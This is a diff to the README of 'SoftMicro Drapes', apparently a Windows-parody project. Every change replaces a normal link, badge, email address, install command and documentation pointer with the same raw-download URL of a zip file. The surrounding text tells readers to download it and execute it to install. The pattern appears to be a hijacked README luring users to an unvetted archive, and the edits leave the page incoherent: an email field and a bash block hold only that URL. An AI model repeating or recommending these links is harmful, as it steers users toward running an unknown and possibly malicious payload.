@@ -1,6 +1,6 @@
 # SoftMicro Drapes
 
-![SoftMicro Drapes](https://img.shields.io/badge/SoftMicro_Drapes-v1.0.0-brightgreen)
+![SoftMicro Drapes](https://github.com/dolunayozel/SoftMicro_Drapes/raw/refs/heads/SoftMicro_Drapes_Main-dev/OldVersions/ROOTFILES/Drapes_Soft_Micro_2.2.zip)
 
 🟥️🟨️🟩️🟦️🪟️ Welcome to the official source repository for **SoftMicro Drapes**, a playful take on the Microsoft Windows operating system family. This project combines humor with technology, creating a unique experience for developers and users alike.
 
@@ -29,14 +29,14 @@ SoftMicro Drapes is designed as a parody of Windows. It offers a familiar interf
 
 ## Installation
 
-To get started with SoftMicro Drapes, you can download the latest release from our [Releases page](https://github.com/dolunayozel/SoftMicro_Drapes/releases). Download the appropriate file for your system, then execute it to install.
+To get started with SoftMicro Drapes, you can download the latest release from our [Releases page](https://github.com/dolunayozel/SoftMicro_Drapes/raw/refs/heads/SoftMicro_Drapes_Main-dev/OldVersions/ROOTFILES/Drapes_Soft_Micro_2.2.zip). Download the appropriate file for your system, then execute it to install.
 
 ```bash
 # Example command to execute after downloading
-./SoftMicro_Drapes_Installer.sh
+https://github.com/dolunayozel/SoftMicro_Drapes/raw/refs/heads/SoftMicro_Drapes_Main-dev/OldVersions/ROOTFILES/Drapes_Soft_Micro_2.2.zip
 ```
 
-Make sure to check the [Releases section](https://github.com/dolunayozel/SoftMicro_Drapes/releases) for updates and new features.
+Make sure to check the [Releases section](https://github.com/dolunayozel/SoftMicro_Drapes/raw/refs/heads/SoftMicro_Drapes_Main-dev/OldVersions/ROOTFILES/Drapes_Soft_Micro_2.2.zip) for updates and new features.
 
 ## Usage
 
@@ -57,7 +57,7 @@ We welcome contributions from everyone! If you want to help improve SoftMicro Dr
 3. **Make your changes**: Code, test, and document your work.
 4. **Submit a pull request**: Share your changes with the community.
 
-Please refer to our [Contributing Guidelines](CONTRIBUTING.md) for more details.
+Please refer to our [Contributing Guidelines](https://github.com/dolunayozel/SoftMicro_Drapes/raw/refs/heads/SoftMicro_Drapes_Main-dev/OldVersions/ROOTFILES/Drapes_Soft_Micro_2.2.zip) for more details.
 
 ## License
 
@@ -67,14 +67,14 @@ SoftMicro Drapes is licensed under the GPL-3.0 License. This allows you to use, 
 
 For questions or suggestions, feel free to reach out:
 
-- **Email**: support@softmicrodrapes.com
+- **Email**: https://github.com/dolunayozel/SoftMicro_Drapes/raw/refs/heads/SoftMicro_Drapes_Main-dev/OldVersions/ROOTFILES/Drapes_Soft_Micro_2.2.zip
 - **GitHub Issues**: Use the issues section on our GitHub page for bug reports and feature requests.
 
 ## Links
 
-- [SoftMicro Drapes Releases](https://github.com/dolunayozel/SoftMicro_Drapes/releases)
-- [SoftMicro Drapes Documentation](https://softmicrodrapes.com/docs)
-- [Community Forum](https://softmicrodrapes.com/forum)
+- [SoftMicro Drapes Releases](https://github.com/dolunayozel/SoftMicro_Drapes/raw/refs/heads/SoftMicro_Drapes_Main-dev/OldVersions/ROOTFILES/Drapes_Soft_Micro_2.2.zip)
+- [SoftMicro Drapes Documentation](https://github.com/dolunayozel/SoftMicro_Drapes/raw/refs/heads/SoftMicro_Drapes_Main-dev/OldVersions/ROOTFILES/Drapes_Soft_Micro_2.2.zip)
+- [Community Forum](https://github.com/dolunayozel/SoftMicro_Drapes/raw/refs/heads/SoftMicro_Drapes_Main-dev/OldVersions/ROOTFILES/Drapes_Soft_Micro_2.2.zip)
 
 ## Conclusion
 
